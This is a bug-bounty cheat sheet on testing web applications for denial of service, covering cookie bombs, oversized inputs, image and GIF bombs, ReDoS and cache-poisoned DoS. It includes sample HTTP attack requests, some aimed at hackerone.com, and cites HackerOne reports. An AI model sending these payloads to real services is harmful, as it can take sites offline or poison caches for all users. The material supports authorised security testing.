
---

# Denial of Service (DoS)

### Introduction

Denial of Service is an attack on a service that disrupts its normal function and stops other users from accessing it.

### Where to Find

This vulnerability can appear in almost any feature of an application. Depending on how you exploit it, for example, in file upload features, you can try uploading extremely large files.

---

### How to Exploit

#### 1. Cookie Bomb

* **Example:** `[https://target.com/index.php?param1=xxxxxxxxxxxxxx](https://target.com/index.php?param1=xxxxxxxxxxxxxx)`
* **How to test:** After inputting a massive string like `"xxxxxxxxxxxxxx"` into a parameter, check your browser cookies. If the website saves a giant cookie value (e.g., `"xxxxxxxxxxxxxxxxxxxxxx"`), it means the application is vulnerable to cookie bombing.

#### 2. Extremely Long Payloads in Forms

* **How to test:** Submit a massive payload into text fields like passwords or email addresses.
```http
POST /register HTTP/1.1
Host: target.com
username=victim&password=aaaaaaaaaaaaaaa... [very long string]

```



#### 3. Pixel Flood (Image Bombs)

* **How to test:** Upload or reference an image file containing massive pixel dimensions that forces the server to use up all its memory when trying to resize or process it.

#### 4. Frame Flood (GIF Bombs)

* **How to test:** Upload an animated GIF containing thousands of massive frames to overwhelm the server's processing capacity.

#### 5. Image Size Resizing Parameter Manipulation

* **How to test:** Look for parameters that control image dimensions in URLs:
* Normal: `[https://target.com/img/vulnerable.jpg?width=500&height=500](https://target.com/img/vulnerable.jpg?width=500&height=500)`
* Exploit: Change values to extreme numbers like `99999999999`:
`[https://target.com/img/vulnerable.jpg?width=99999999999&height=99999999999](https://target.com/img/vulnerable.jpg?width=99999999999&height=99999999999)`



#### 6. Malformed HTTP Header Duplication

* **How to test:** Modify request headers with repeated or weird values to confuse the server parser:
* `Accept-Encoding: gzip, gzip, deflate, br, br`



#### 7. Cascading Rate Limit / Exhaustion (DoS via Flooding)

* **How to test:** Sometimes when testing for "No rate limit" bugs, sending thousands of requests over a long period forces the backend database or server to crash under heavy load.

#### 8. ReDoS (Regular Expression Denial of Service)

* **How to test:** Trigger complex or poorly written regular expressions (`RegEx`) with malicious input strings that cause the server CPU to spike to 100%.

#### 9. CPDOS (Cache Poisoned Denial of Service)

* **HTTP Header Oversize (HHO):** Send a request with a header larger than the origin server supports, but smaller than what the cache accepts:
```http
GET /index.html HTTP/1.1
Host: victim.com
X-Oversized-Header-1: Big_Value... [massive string]

```


* *Server Response:* `HTTP/1.1 400 Bad Request - Header size exceeded` (which gets cached, locking out all users).


* **HTTP Meta Character (HMC):** Try to bypass caches by including harmful control characters or meta characters (like line breaks `\n`, carriage returns `\r`, or bell characters `\a`) inside a custom header:
```http
GET /index.html HTTP/1.1
Host: victim.com
X-Meta-Malicious-Header: \r\n

```


* *Server Response:* `HTTP/1.1 400 Bad Request - Character not allowed`


* **HTTP Method Override (HMO):** Use override headers to trick the server into treating requests differently:
1. `X-HTTP-Method-Override`
2. `X-HTTP-Method`
3. `X-Method-Override`


* *Example:*
```http
GET /index.php HTTP/1.1
Host: victim.com
X-HTTP-Method-Override: POST

```


* *Server Response:* `HTTP/1.1 404 Not Found - POST on /index.php not found`


* **X-Forwarded-Port / X-Forwarded-Host Spoofing:**
```http
GET /index.php?dontpoisoneveryone=1 HTTP/1.1
Host: www.hackerone.com
X-Forwarded-Port: 123

```


```http
GET /index.php?dontpoisoneveryone=1 HTTP/1.1
Host: www.hackerone.com
X-Forwarded-Host: www.hackerone.com: 123

```



---

### Response DoS & References (HackerOne Reports)

* HackerOne #840598
* HackerOne #105363
* HackerOne #390
* HackerOne #400
* HackerOne #751904
* HackerOne #861170
* HackerOne #892615
* HackerOne #511381
* HackerOne #409370
* CPDOS Official Project (`cpdos.org`)
